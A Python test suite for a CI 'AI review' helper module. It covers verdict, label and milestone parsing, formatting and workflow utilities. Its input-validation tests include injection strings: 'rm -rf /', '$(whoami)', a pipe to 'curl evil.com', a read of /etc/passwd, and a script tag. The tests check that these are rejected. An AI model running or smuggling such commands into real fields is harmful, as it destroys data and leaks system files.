"""Tests for AI Review Common module, porting and exceeding Pester coverage."""

from __future__ import annotations

import json
import os
import subprocess
from pathlib import Path
from unittest.mock import patch

import pytest

from scripts.ai_review import (
    assert_environment_variables,
    convert_to_json_escaped,
    format_collapsible_section,
    format_markdown_table_row,
    format_verdict_alert,
    get_concurrency_group_from_run,
    get_failure_category,
    get_labels,
    get_labels_from_ai_output,
    get_milestone,
    get_milestone_from_ai_output,
    get_pr_changed_files,
    get_verdict,
    get_verdict_alert_type,
    get_verdict_emoji,
    get_verdict_exit_code,
    get_workflow_runs_by_pr,
    initialize_ai_review,
    invoke_with_retry,
    merge_verdicts,
    runs_overlap,
    spec_validation_failed,
    write_log,
    write_log_error,
)

# ---------------------------------------------------------------------------
# Helpers
# ---------------------------------------------------------------------------


def _completed(stdout: str = "", stderr: str = "", rc: int = 0):
    return subprocess.CompletedProcess(args=[], returncode=rc, stdout=stdout, stderr=stderr)


# ---------------------------------------------------------------------------
# Verdict parsing
# ---------------------------------------------------------------------------


class TestGetVerdict:
    def test_explicit_verdict_pass(self):
        assert get_verdict("Analysis complete. VERDICT: PASS. Good work!") == "PASS"

    def test_explicit_verdict_critical_fail(self):
        assert get_verdict("Found issues. VERDICT: CRITICAL_FAIL") == "CRITICAL_FAIL"

    def test_explicit_verdict_warn(self):
        assert get_verdict("Minor issues found. VERDICT: WARN") == "WARN"

    def test_explicit_verdict_rejected(self):
        assert get_verdict("Cannot approve. VERDICT: REJECTED") == "REJECTED"

    def test_keyword_critical_fail_severe(self):
        assert get_verdict("This has a severe issue that needs attention") == "CRITICAL_FAIL"

    def test_keyword_rejected_must_fix(self):
        assert get_verdict("You must fix this before merging") == "REJECTED"

    def test_keyword_rejected_blocking(self):
        assert get_verdict("This is a blocking issue") == "REJECTED"

    def test_keyword_pass_approved(self):
        assert get_verdict("Changes approved, good to merge") == "PASS"

    def test_keyword_pass_looks_good(self):
        assert get_verdict("Everything looks good to me") == "PASS"

    def test_keyword_pass_no_issues(self):
        assert get_verdict("I found no issues with this code") == "PASS"

    def test_keyword_warn_warning(self):
        assert get_verdict("There is a warning about potential issues") == "WARN"

    def test_keyword_warn_caution(self):
        assert get_verdict("Proceed with caution on this change") == "WARN"

    def test_empty_output(self):
        assert get_verdict("") == "CRITICAL_FAIL"

    def test_none_output(self):
        assert get_verdict("") == "CRITICAL_FAIL"

    def test_whitespace_only(self):
        assert get_verdict("   ") == "CRITICAL_FAIL"

    def test_unparseable_output(self):
        assert get_verdict("Some random text without any verdict keywords") == "CRITICAL_FAIL"

    def test_explicit_verdict_overrides_keyword(self):
        assert get_verdict("This looks good but VERDICT: CRITICAL_FAIL") == "CRITICAL_FAIL"


# ---------------------------------------------------------------------------
# Label parsing
# ---------------------------------------------------------------------------


class TestGetLabels:
    def test_single_label(self):
        labels = get_labels("Analysis complete. LABEL: bug")
        assert labels == ["bug"]

    def test_multiple_labels(self):
        labels = get_labels("LABEL: bug LABEL: enhancement LABEL: priority-high")
        assert len(labels) == 3
        assert "bug" in labels
        assert "enhancement" in labels
        assert "priority-high" in labels

    def test_no_labels(self):
        assert get_labels("No labels here") == []

    def test_empty_input(self):
        assert get_labels("") == []

    def test_whitespace_only(self):
        assert get_labels("   ") == []

    def test_multiline_output(self):
        output = "Review analysis:\nLABEL: security\nLABEL: needs-review\nSummary complete."
        labels = get_labels(output)
        assert len(labels) == 2
        assert "security" in labels
        assert "needs-review" in labels

    def test_adjacent_labels(self):
        labels = get_labels("LABEL:bug LABEL:urgent")
        assert len(labels) == 2


# ---------------------------------------------------------------------------
# Milestone parsing
# ---------------------------------------------------------------------------


class TestGetMilestone:
    def test_extracts_milestone(self):
        assert get_milestone("MILESTONE: v2.0 VERDICT: PASS") == "v2.0"

    def test_no_milestone(self):
        assert get_milestone("No milestone specified") == ""

    def test_empty_input(self):
        assert get_milestone("") == ""

    def test_whitespace_only(self):
        assert get_milestone("   ") == ""

    def test_milestone_with_numbers(self):
        assert get_milestone("MILESTONE: Sprint-42") == "Sprint-42"


# ---------------------------------------------------------------------------
# Verdict aggregation
# ---------------------------------------------------------------------------


class TestMergeVerdicts:
    def test_all_pass(self):
        assert merge_verdicts(["PASS", "PASS", "PASS"]) == "PASS"

    def test_warn_with_pass(self):
        assert merge_verdicts(["PASS", "WARN", "PASS"]) == "WARN"

    def test_critical_fail_present(self):
        assert merge_verdicts(["PASS", "CRITICAL_FAIL", "PASS"]) == "CRITICAL_FAIL"

    def test_rejected_present(self):
        assert merge_verdicts(["PASS", "REJECTED", "WARN"]) == "CRITICAL_FAIL"

    def test_critical_over_warn(self):
        assert merge_verdicts(["WARN", "CRITICAL_FAIL", "WARN"]) == "CRITICAL_FAIL"

    def test_single_pass(self):
        assert merge_verdicts(["PASS"]) == "PASS"

    def test_single_critical_fail(self):
        assert merge_verdicts(["CRITICAL_FAIL"]) == "CRITICAL_FAIL"

    def test_fail_present(self):
        assert merge_verdicts(["PASS", "FAIL", "WARN"]) == "CRITICAL_FAIL"

    def test_empty_array(self):
        assert merge_verdicts([]) == "PASS"


# ---------------------------------------------------------------------------
# Failure categorization
# ---------------------------------------------------------------------------


class TestGetFailureCategory:
    def test_exit_code_124_is_infrastructure(self):
        assert get_failure_category(exit_code=124) == "INFRASTRUCTURE"

    def test_exit_code_124_overrides_message(self):
        assert (
            get_failure_category(exit_code=124, message="Security vulnerability detected")
            == "INFRASTRUCTURE"
        )

    def test_rate_limit_message(self):
        assert get_failure_category(message="rate limit exceeded") == "INFRASTRUCTURE"

    def test_ratelimit_no_space(self):
        assert get_failure_category(message="API ratelimit hit") == "INFRASTRUCTURE"

    def test_timeout_message(self):
        assert get_failure_category(message="Request timed out") == "INFRASTRUCTURE"

    def test_429_error(self):
        assert get_failure_category(message="HTTP 429 Too Many Requests") == "INFRASTRUCTURE"

    def test_network_error(self):
        assert get_failure_category(message="network error connecting to API") == "INFRASTRUCTURE"

    def test_502_bad_gateway(self):
        assert get_failure_category(stderr="502 Bad Gateway") == "INFRASTRUCTURE"

    def test_503_service_unavailable(self):
        assert get_failure_category(stderr="503 Service Unavailable") == "INFRASTRUCTURE"

    def test_connection_refused(self):
        assert get_failure_category(stderr="connection refused") == "INFRASTRUCTURE"

    def test_connection_reset(self):
        assert get_failure_category(stderr="connection reset by peer") == "INFRASTRUCTURE"

    def test_connection_timeout(self):
        assert get_failure_category(stderr="connection timeout") == "INFRASTRUCTURE"

    def test_copilot_cli_no_output(self):
        assert (
            get_failure_category(message="Copilot CLI failed (exit code 1) with no output")
            == "INFRASTRUCTURE"
        )

    def test_missing_copilot_access(self):
        assert (
            get_failure_category(message="missing Copilot access for the bot account")
            == "INFRASTRUCTURE"
        )

    def test_insufficient_scopes(self):
        assert (
            get_failure_category(message="insufficient scopes for this operation")
            == "INFRASTRUCTURE"
        )

    def test_empty_output_is_infrastructure(self):
        assert get_failure_category(message="", stderr="") == "INFRASTRUCTURE"

    def test_no_args_is_infrastructure(self):
        assert get_failure_category() == "INFRASTRUCTURE"

    def test_security_vulnerability_is_code_quality(self):
        assert (
            get_failure_category(message="Security vulnerability detected in dependencies")
            == "CODE_QUALITY"
        )

    def test_code_quality_failure(self):
        msg = "VERDICT: CRITICAL_FAIL - Code does not meet quality standards"
        assert get_failure_category(message=msg) == "CODE_QUALITY"

    def test_test_failure(self):
        assert (
            get_failure_category(message="Tests failed: 3 assertions did not pass")
            == "CODE_QUALITY"
        )

    def test_missing_docs_is_code_quality(self):
        assert (
            get_failure_category(message="Missing documentation for public API")
            == "CODE_QUALITY"
        )

    def test_message_checked_before_stderr(self):
        assert (
            get_failure_category(message="rate limit exceeded", stderr="")
            == "INFRASTRUCTURE"
        )

    def test_stderr_checked_when_message_no_match(self):
        assert (
            get_failure_category(message="Some unrelated message", stderr="503 Service Unavailable")
            == "INFRASTRUCTURE"
        )

    def test_case_insensitive(self):
        assert get_failure_category(message="RATE LIMIT EXCEEDED") == "INFRASTRUCTURE"
        assert get_failure_category(message="Rate Limit") == "INFRASTRUCTURE"


# ---------------------------------------------------------------------------
# Spec validation
# ---------------------------------------------------------------------------


class TestSpecValidationFailed:
    def test_trace_critical_fail(self):
        assert spec_validation_failed("CRITICAL_FAIL", "PASS") is True

    def test_trace_fail(self):
        assert spec_validation_failed("FAIL", "PASS") is True

    def test_trace_needs_review(self):
        assert spec_validation_failed("NEEDS_REVIEW", "PASS") is True

    def test_completeness_critical_fail(self):
        assert spec_validation_failed("PASS", "CRITICAL_FAIL") is True

    def test_completeness_fail(self):
        assert spec_validation_failed("PASS", "FAIL") is True

    def test_completeness_partial(self):
        assert spec_validation_failed("PASS", "PARTIAL") is True

    def test_completeness_needs_review(self):
        assert spec_validation_failed("PASS", "NEEDS_REVIEW") is True

    def test_both_pass(self):
        assert spec_validation_failed("PASS", "PASS") is False

    def test_trace_warn_completeness_pass(self):
        assert spec_validation_failed("WARN", "PASS") is False

    def test_trace_pass_completeness_warn(self):
        assert spec_validation_failed("PASS", "WARN") is False

    def test_both_warn(self):
        assert spec_validation_failed("WARN", "WARN") is False

    def test_both_fail(self):
        assert spec_validation_failed("FAIL", "FAIL") is True

    def test_warn_with_partial(self):
        assert spec_validation_failed("WARN", "PARTIAL") is True

    def test_empty_verdicts(self):
        assert spec_validation_failed("", "") is False

    def test_unknown_verdicts(self):
        assert spec_validation_failed("UNKNOWN", "UNKNOWN") is False

    def test_case_insensitive(self):
        assert spec_validation_failed("fail", "pass") is True
        assert spec_validation_failed("FAIL", "PASS") is True
        assert spec_validation_failed("Fail", "Pass") is True

    def test_trace_failure_with_completeness_pass(self):
        assert spec_validation_failed("CRITICAL_FAIL", "PASS") is True

    def test_completeness_failure_with_trace_pass(self):
        assert spec_validation_failed("PASS", "CRITICAL_FAIL") is True


# ---------------------------------------------------------------------------
# Formatting: verdict alert type
# ---------------------------------------------------------------------------


class TestGetVerdictAlertType:
    def test_pass(self):
        assert get_verdict_alert_type("PASS") == "TIP"

    def test_compliant(self):
        assert get_verdict_alert_type("COMPLIANT") == "TIP"

    def test_warn(self):
        assert get_verdict_alert_type("WARN") == "WARNING"

    def test_partial(self):
        assert get_verdict_alert_type("PARTIAL") == "WARNING"

    def test_critical_fail(self):
        assert get_verdict_alert_type("CRITICAL_FAIL") == "CAUTION"

    def test_rejected(self):
        assert get_verdict_alert_type("REJECTED") == "CAUTION"

    def test_fail(self):
        assert get_verdict_alert_type("FAIL") == "CAUTION"

    def test_unknown(self):
        assert get_verdict_alert_type("SOMETHING_ELSE") == "NOTE"


# ---------------------------------------------------------------------------
# Formatting: verdict exit code
# ---------------------------------------------------------------------------


class TestGetVerdictExitCode:
    def test_pass_returns_0(self):
        assert get_verdict_exit_code("PASS") == 0

    def test_warn_returns_0(self):
        assert get_verdict_exit_code("WARN") == 0

    def test_critical_fail_returns_1(self):
        assert get_verdict_exit_code("CRITICAL_FAIL") == 1

    def test_rejected_returns_1(self):
        assert get_verdict_exit_code("REJECTED") == 1

    def test_fail_returns_1(self):
        assert get_verdict_exit_code("FAIL") == 1

    def test_unknown_returns_0(self):
        assert get_verdict_exit_code("UNKNOWN") == 0


# ---------------------------------------------------------------------------
# Formatting: verdict emoji
# ---------------------------------------------------------------------------


class TestGetVerdictEmoji:
    def test_pass(self):
        assert get_verdict_emoji("PASS") == "\u2705"

    def test_compliant(self):
        assert get_verdict_emoji("COMPLIANT") == "\u2705"

    def test_warn(self):
        assert get_verdict_emoji("WARN") == "\u26a0\ufe0f"

    def test_partial(self):
        assert get_verdict_emoji("PARTIAL") == "\u26a0\ufe0f"

    def test_critical_fail(self):
        assert get_verdict_emoji("CRITICAL_FAIL") == "\u274c"

    def test_rejected(self):
        assert get_verdict_emoji("REJECTED") == "\u274c"

    def test_fail(self):
        assert get_verdict_emoji("FAIL") == "\u274c"

    def test_unknown(self):
        assert get_verdict_emoji("UNKNOWN") == "\u2754"


# ---------------------------------------------------------------------------
# Formatting: collapsible section
# ---------------------------------------------------------------------------


class TestFormatCollapsibleSection:
    def test_valid_html(self):
        result = format_collapsible_section("Details", "Inner content")
        assert "<details>" in result
        assert "</details>" in result
        assert "<summary>Details</summary>" in result
        assert "Inner content" in result

    def test_multiline_content(self):
        content = "Line 1\nLine 2\nLine 3"
        result = format_collapsible_section("Multi", content)
        assert "Line 1" in result
        assert "Line 2" in result
        assert "Line 3" in result


# ---------------------------------------------------------------------------
# Formatting: verdict alert
# ---------------------------------------------------------------------------


class TestFormatVerdictAlert:
    def test_pass_tip(self):
        result = format_verdict_alert("PASS")
        assert "[!TIP]" in result
        assert "Verdict: PASS" in result

    def test_warn_warning(self):
        result = format_verdict_alert("WARN")
        assert "[!WARNING]" in result

    def test_critical_fail_caution(self):
        result = format_verdict_alert("CRITICAL_FAIL")
        assert "[!CAUTION]" in result

    def test_rejected_caution(self):
        result = format_verdict_alert("REJECTED")
        assert "[!CAUTION]" in result

    def test_includes_message(self):
        result = format_verdict_alert("PASS", "All checks passed")
        assert "All checks passed" in result

    def test_unknown_note(self):
        result = format_verdict_alert("UNKNOWN")
        assert "[!NOTE]" in result


# ---------------------------------------------------------------------------
# Formatting: markdown table row
# ---------------------------------------------------------------------------


class TestFormatMarkdownTableRow:
    def test_three_columns(self):
        assert format_markdown_table_row(["A", "B", "C"]) == "| A | B | C |"

    def test_single_column(self):
        assert format_markdown_table_row(["Single"]) == "| Single |"

    def test_many_columns(self):
        assert format_markdown_table_row(["A", "B", "C", "D", "E"]) == "| A | B | C | D | E |"


# ---------------------------------------------------------------------------
# Formatting: JSON escaping
# ---------------------------------------------------------------------------


class TestConvertToJsonEscaped:
    def test_escape_quotes(self):
        assert convert_to_json_escaped('Hello "World"') == '"Hello \\"World\\""'

    def test_empty_string(self):
        assert convert_to_json_escaped("") == '""'

    def test_special_characters(self):
        result = convert_to_json_escaped("Line1\nLine2")
        assert "\\n" in result

    def test_plain_string(self):
        assert convert_to_json_escaped("test") == '"test"'


# ---------------------------------------------------------------------------
# Workflow: initialization
# ---------------------------------------------------------------------------


class TestInitializeAIReview:
    def test_creates_directory(self, tmp_path: Path):
        target = tmp_path / "ai-review-test"
        result = initialize_ai_review(str(target))
        assert target.exists()
        assert result == str(target)

    def test_returns_path(self, tmp_path: Path):
        target = tmp_path / "existing"
        target.mkdir()
        result = initialize_ai_review(str(target))
        assert result == str(target)

    def test_uses_env_var(self, tmp_path: Path):
        target = str(tmp_path / "env-dir")
        with patch.dict(os.environ, {"AI_REVIEW_DIR": target}):
            result = initialize_ai_review()
        assert result == target
        assert Path(target).exists()


# ---------------------------------------------------------------------------
# Workflow: retry logic
# ---------------------------------------------------------------------------


class TestInvokeWithRetry:
    def test_returns_on_success(self):
        assert invoke_with_retry(lambda: "success", max_retries=3, initial_delay=0) == "success"

    def test_retries_and_succeeds(self):
        attempts = {"count": 0}

        def _flaky():
            attempts["count"] += 1
            if attempts["count"] < 2:
                raise ValueError("Temporary failure")
            return "success after retry"

        result = invoke_with_retry(_flaky, max_retries=3, initial_delay=0)
        assert result == "success after retry"
        assert attempts["count"] == 2

    def test_raises_after_max_retries(self):
        def _always_fail():
            raise ValueError("Permanent failure")

        with pytest.raises(RuntimeError, match="All 2 attempts failed"):
            invoke_with_retry(_always_fail, max_retries=2, initial_delay=0)

    def test_exponential_backoff(self):
        delays: list[float] = []

        def _mock_sleep(seconds):
            delays.append(seconds)

        def _always_fail():
            raise ValueError("fail")

        with patch("time.sleep", side_effect=_mock_sleep):
            with pytest.raises(RuntimeError):
                invoke_with_retry(_always_fail, max_retries=3, initial_delay=1)

        assert delays == [1, 2]


# ---------------------------------------------------------------------------
# Workflow: logging
# ---------------------------------------------------------------------------


class TestWriteLog:
    def test_logs_message(self, caplog):
        import logging

        with caplog.at_level(logging.INFO):
            write_log("Test message")
        assert "Test message" in caplog.text


class TestWriteLogError:
    def test_logs_error(self, caplog):
        import logging

        with caplog.at_level(logging.ERROR):
            write_log_error("Failure message")
        assert "ERROR: Failure message" in caplog.text


# ---------------------------------------------------------------------------
# Workflow: environment validation
# ---------------------------------------------------------------------------


class TestAssertEnvironmentVariables:
    def test_passes_when_all_set(self):
        with patch.dict(os.environ, {"VAR_A": "1", "VAR_B": "2"}):
            assert_environment_variables(["VAR_A", "VAR_B"])

    def test_raises_when_missing(self):
        with patch.dict(os.environ, {"VAR_A": "1"}, clear=False):
            os.environ.pop("MISSING_VAR", None)
            with pytest.raises(RuntimeError, match="MISSING_VAR"):
                assert_environment_variables(["VAR_A", "MISSING_VAR"])

    def test_lists_all_missing(self):
        with patch.dict(os.environ, {}, clear=False):
            os.environ.pop("MISS_A", None)
            os.environ.pop("MISS_B", None)
            with pytest.raises(RuntimeError, match=r"MISS_A.*MISS_B"):
                assert_environment_variables(["MISS_A", "MISS_B"])

    def test_empty_string_is_missing(self):
        with patch.dict(os.environ, {"EMPTY_VAR": ""}):
            with pytest.raises(RuntimeError, match="EMPTY_VAR"):
                assert_environment_variables(["EMPTY_VAR"])


# ---------------------------------------------------------------------------
# Workflow: PR changed files
# ---------------------------------------------------------------------------


class TestGetPRChangedFiles:
    def test_returns_filtered_files(self):
        stdout = "src/main.py\nREADME.md\nsrc/utils.py\n"
        with patch.dict(os.environ, {"GITHUB_REPOSITORY": "owner/repo"}):
            with patch("subprocess.run", return_value=_completed(stdout=stdout)):
                result = get_pr_changed_files(123, pattern=r"\.py$")
        assert result == ["src/main.py", "src/utils.py"]

    def test_returns_all_when_no_pattern(self):
        stdout = "a.py\nb.md\n"
        with patch.dict(os.environ, {"GITHUB_REPOSITORY": "owner/repo"}):
            with patch("subprocess.run", return_value=_completed(stdout=stdout)):
                result = get_pr_changed_files(42)
        assert len(result) == 2

    def test_returns_empty_on_failure(self):
        with patch.dict(os.environ, {"GITHUB_REPOSITORY": "owner/repo"}):
            with patch("subprocess.run", return_value=_completed(rc=1, stderr="err")):
                result = get_pr_changed_files(1)
        assert result == []


# ---------------------------------------------------------------------------
# Workflow: workflow run analysis
# ---------------------------------------------------------------------------


class TestGetWorkflowRunsByPR:
    def test_returns_filtered_runs(self):
        runs = [
            {"name": "quality-gate", "pull_requests": [{"number": 42}]},
            {"name": "other", "pull_requests": [{"number": 99}]},
        ]
        with patch(
            "subprocess.run",
            return_value=_completed(stdout=json.dumps(runs)),
        ):
            result = get_workflow_runs_by_pr(42, repository="owner/repo")
        assert len(result) == 1
        assert result[0]["name"] == "quality-gate"

    def test_filters_by_workflow_name(self):
        runs = [
            {"name": "ai-quality-gate", "pull_requests": [{"number": 42}]},
            {"name": "label-pr", "pull_requests": [{"number": 42}]},
        ]
        with patch(
            "subprocess.run",
            return_value=_completed(stdout=json.dumps(runs)),
        ):
            result = get_workflow_runs_by_pr(42, workflow_name="quality", repository="o/r")
        assert len(result) == 1

    def test_raises_on_api_failure(self):
        with patch(
            "subprocess.run",
            return_value=_completed(rc=1, stderr="API error"),
        ):
            with pytest.raises(RuntimeError, match="Failed to get workflow runs"):
                get_workflow_runs_by_pr(1, repository="o/r")


class TestRunsOverlap:
    def test_overlapping_runs(self):
        run1 = {"created_at": "2026-01-01T00:00:00Z", "updated_at": "2026-01-01T01:00:00Z"}
        run2 = {"created_at": "2026-01-01T00:30:00Z", "updated_at": "2026-01-01T01:30:00Z"}
        assert runs_overlap(run1, run2) is True

    def test_non_overlapping_runs(self):
        run1 = {"created_at": "2026-01-01T00:00:00Z", "updated_at": "2026-01-01T01:00:00Z"}
        run2 = {"created_at": "2026-01-01T02:00:00Z", "updated_at": "2026-01-01T03:00:00Z"}
        assert runs_overlap(run1, run2) is False

    def test_run2_starts_exactly_at_run1_end(self):
        run1 = {"created_at": "2026-01-01T00:00:00Z", "updated_at": "2026-01-01T01:00:00Z"}
        run2 = {"created_at": "2026-01-01T01:00:00Z", "updated_at": "2026-01-01T02:00:00Z"}
        assert runs_overlap(run1, run2) is False


class TestGetConcurrencyGroupFromRun:
    def test_quality_gate_pr(self):
        run = {
            "name": "ai-quality-gate",
            "event": "pull_request",
            "pull_requests": [{"number": 42}],
            "head_branch": "feat/test",
        }
        assert get_concurrency_group_from_run(run) == "ai-quality-42"

    def test_spec_validation_pr(self):
        run = {
            "name": "spec-validation",
            "event": "pull_request",
            "pull_requests": [{"number": 10}],
            "head_branch": "feat/spec",
        }
        assert get_concurrency_group_from_run(run) == "spec-validation-10"

    def test_label_pr(self):
        run = {
            "name": "label-pr",
            "event": "pull_request",
            "pull_requests": [{"number": 5}],
            "head_branch": "feat/label",
        }
        assert get_concurrency_group_from_run(run) == "label-pr-5"

    def test_default_prefix_for_unknown_workflow(self):
        run = {
            "name": "custom-workflow",
            "event": "pull_request",
            "pull_requests": [{"number": 7}],
            "head_branch": "feat/x",
        }
        assert get_concurrency_group_from_run(run) == "pr-validation-7"

    def test_fallback_without_pr(self):
        run = {
            "name": "nightly-build",
            "event": "schedule",
            "pull_requests": [],
            "head_branch": "main",
        }
        assert get_concurrency_group_from_run(run) == "nightly-build-main"


# ---------------------------------------------------------------------------
# Security-hardened JSON parsing: labels
# ---------------------------------------------------------------------------


class TestGetLabelsFromAIOutput:
    def test_single_valid_label(self):
        labels = get_labels_from_ai_output('{"labels":["bug"]}')
        assert labels == ["bug"]

    def test_multiple_valid_labels(self):
        labels = get_labels_from_ai_output('{"labels":["bug","enhancement","docs"]}')
        assert len(labels) == 3
        assert "bug" in labels

    def test_labels_with_hyphens(self):
        labels = get_labels_from_ai_output('{"labels":["priority-high","needs-review"]}')
        assert "priority-high" in labels

    def test_labels_with_underscores(self):
        labels = get_labels_from_ai_output('{"labels":["good_first_issue"]}')
        assert "good_first_issue" in labels

    def test_labels_with_periods(self):
        labels = get_labels_from_ai_output('{"labels":["v1.0.0"]}')
        assert "v1.0.0" in labels

    def test_labels_with_spaces(self):
        labels = get_labels_from_ai_output('{"labels":["help wanted","good first issue"]}')
        assert len(labels) == 2
        assert "help wanted" in labels

    def test_rejects_semicolon_injection(self):
        assert get_labels_from_ai_output('{"labels":["bug; rm -rf /"]}') == []

    def test_rejects_backtick_injection(self):
        assert get_labels_from_ai_output('{"labels":["bug`whoami`"]}') == []

    def test_rejects_dollar_injection(self):
        assert get_labels_from_ai_output('{"labels":["bug$(whoami)"]}') == []

    def test_rejects_pipe_injection(self):
        assert get_labels_from_ai_output('{"labels":["bug | curl evil.com"]}') == []

    def test_rejects_newline_injection(self):
        assert get_labels_from_ai_output('{"labels":["bug\\ninjected"]}') == []

    def test_empty_array(self):
        assert get_labels_from_ai_output('{"labels":[]}') == []

    def test_missing_key(self):
        assert get_labels_from_ai_output('{"milestone":"v1"}') == []

    def test_null_input(self):
        assert get_labels_from_ai_output(None) == []

    def test_empty_input(self):
        assert get_labels_from_ai_output("") == []

    def test_whitespace_input(self):
        assert get_labels_from_ai_output("   ") == []

    def test_rejects_over_50_chars(self):
        long_label = "a" * 51
        assert get_labels_from_ai_output(f'{{"labels":["{long_label}"]}}') == []

    def test_rejects_leading_special_char(self):
        assert get_labels_from_ai_output('{"labels":["-invalid"]}') == []
        assert get_labels_from_ai_output('{"labels":["_bad"]}') == []
        assert get_labels_from_ai_output('{"labels":[".wrong"]}') == []

    def test_mixed_valid_and_invalid(self):
        output = '{"labels":["bug","evil; rm -rf /","enhancement"]}'
        labels = get_labels_from_ai_output(output)
        assert len(labels) == 2
        assert "bug" in labels
        assert "enhancement" in labels
        assert "evil; rm -rf /" not in labels


# ---------------------------------------------------------------------------
# Security-hardened JSON parsing: milestones
# ---------------------------------------------------------------------------


class TestGetMilestoneFromAIOutput:
    def test_semantic_version(self):
        assert get_milestone_from_ai_output('{"milestone":"v1.2.0"}') == "v1.2.0"

    def test_alphanumeric(self):
        assert get_milestone_from_ai_output('{"milestone":"Sprint42"}') == "Sprint42"

    def test_with_hyphens(self):
        assert get_milestone_from_ai_output('{"milestone":"Q4-2024"}') == "Q4-2024"

    def test_with_spaces(self):
        assert get_milestone_from_ai_output('{"milestone":"Release 2.0"}') == "Release 2.0"

    def test_rejects_semicolon_injection(self):
        assert get_milestone_from_ai_output('{"milestone":"v1; rm -rf /"}') is None

    def test_rejects_pipe_injection(self):
        assert get_milestone_from_ai_output('{"milestone":"v1 | curl evil.com"}') is None

    def test_empty_value(self):
        assert get_milestone_from_ai_output('{"milestone":""}') is None

    def test_missing_key(self):
        assert get_milestone_from_ai_output('{"labels":["bug"]}') is None

    def test_null_input(self):
        assert get_milestone_from_ai_output(None) is None

    def test_empty_input(self):
        assert get_milestone_from_ai_output("") is None

    def test_rejects_over_50_chars(self):
        long = "v" + "1" * 50
        assert get_milestone_from_ai_output(f'{{"milestone":"{long}"}}') is None


# ---------------------------------------------------------------------------
# Integration: complete AI output parsing
# ---------------------------------------------------------------------------


class TestJSONParsingIntegration:
    def test_complete_triage_output(self):
        output = json.dumps({
            "category": "bug",
            "labels": ["bug", "critical", "needs-triage"],
            "milestone": "v1.2.0",
            "confidence": 0.95,
        })
        labels = get_labels_from_ai_output(output)
        milestone = get_milestone_from_ai_output(output)
        assert len(labels) == 3
        assert "bug" in labels
        assert milestone == "v1.2.0"

    def test_messy_whitespace_output(self):
        output = (
            '{\n    "labels" : [ "enhancement" , "documentation" ] ,'
            '\n    "milestone" : "Sprint 42"\n}'
        )
        labels = get_labels_from_ai_output(output)
        milestone = get_milestone_from_ai_output(output)
        assert len(labels) == 2
        assert milestone == "Sprint 42"

    def test_malicious_inputs_never_throw(self):
        malicious = [
            '{"labels":["$(whoami)","${IFS}cat${IFS}/etc/passwd"]}',
            '{"milestone":"v1`id`"}',
            '{"labels":["\\x00\\x00"]}',
            '{"labels":["<script>alert(1)</script>"]}',
        ]
        for inp in malicious:
            get_labels_from_ai_output(inp)
            get_milestone_from_ai_output(inp)
